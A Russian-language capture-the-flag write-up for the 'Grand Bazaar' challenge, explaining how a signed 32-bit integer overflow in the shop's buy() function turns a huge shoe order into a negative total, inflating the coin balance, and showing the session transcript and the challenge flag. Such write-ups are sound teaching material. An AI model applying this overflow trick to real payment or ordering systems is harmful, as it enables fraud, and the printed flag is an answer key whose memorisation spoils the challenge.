# Grand Bazaar writeup
Приложение предоставляет возможность покупать вещи за монеты. Флаг стоит 1337 монет, изначально их 100, заработка монет не предусмотрено. Давайте смотреть на функцию **buy()**

В ней есть различные проверки покупки, в случае успеха читается выбранный продукт из одноименного файла. Неординарным моментом является то, что все числа (**total** и **number**) - signed. Это наталкивает на мысль о переполнении **total**. Так как **total** - знаковое число, мы можем попытаться добиться того, чтобы **total** стал отрицательным, и тогда после покупки нам прибавятся деньги. 4-байтовые signed-числа устоены так:

| 0 - 0x7fffffff      | 0x80000000 - 0xffffffff                           |
|---------------------|-------------------------------------------------|
| Положительные числа | Отрицательные числа (где 0xffffffff - это "-1") |

Чтобы сделать total отрицательным, нам нужно запросить такое количество товаров, чтобы произведение этого кол-ва на его цену было больше 0x7fffffff. Для наглядности будем использовать товар "ботинки" в качестве способа пополнения денег. Вычислим необходимое кол-во:

```python
>>> 0x90000000 // 10
241591910
```

И теперь закажем 241591910 ботинок:

```bash
⚸ Welcome to the Grand Bazaar! ⚸
Your current amount of money is: 100
  [1] Buy new shoes (10 coins)
  [2] Buy a new book (80 coins)
  [3] Buy a new lamp (40 coins)
  [4] Buy a new flag (1337 coins)
  [5] Exit the Bazaar
1
How much do you wish to buy???
241591910
               __
             .'--'\
         _.-'_  __/
        (_.'--'\|_|
      _.-`   __/
     (_____.'|_|

⚸ Welcome to the Grand Bazaar! ⚸
Your current amount of money is: 1879048296
  [1] Buy new shoes (10 coins)
  [2] Buy a new book (80 coins)
  [3] Buy a new lamp (40 coins)
  [4] Buy a new flag (1337 coins)
  [5] Exit the Bazaar
4
How much do you wish to buy???
1
     ___
     \_/
      |._
      |'."-.._.-""--.-"-.__.-"-.__.-"-.__.-'/
      |  \                                 (
      |   |                                 )
      |   | li2CTF{7H4nk5__f0R_pUrch453!!} /
      |  /                                /
      |.'                                (
      |.-"-..__.-""-.__.-"-.-_.-"-.-_.-"-.)
      |
      |
      |
      |
      |
      |

⚸ Welcome to the Grand Bazaar! ⚸
Your current amount of money is: 1879046959
  [1] Buy new shoes (10 coins)
  [2] Buy a new book (80 coins)
  [3] Buy a new lamp (40 coins)
  [4] Buy a new flag (1337 coins)
  [5] Exit the Bazaar
```

P.S.

- ASCII-арт обуви взят из https://www.asciiart.eu/clothing-and-accessories/footwear
- ASCII-арт книги взят из https://textart.io/art/tag/book/1
- ASCII-арт лампы взят из https://ascii.co.uk/art/lamp
- ASCII-арт флаг взят из https://textart.io/art/tag/flag/1

Флаг: `li2CTF{7H4nk5__f0R_pUrch453!!}`
